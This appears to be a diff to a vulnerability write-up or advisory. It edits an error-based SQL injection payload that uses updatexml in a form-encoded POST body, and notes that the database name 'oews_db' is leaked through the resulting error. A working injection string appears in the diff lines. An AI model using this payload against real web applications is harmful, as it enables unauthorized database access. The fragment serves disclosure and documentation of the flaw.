@@ -36,7 +36,7 @@ Connection: close
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 53
 
-id=1 and updatexml(1,concat(0x7e,(database())),3)-- q
+id=1 and updatexml(1,concat(0x7e,(database())),3) #
 ```
 
 Get the database name directly through the error report: oews_db
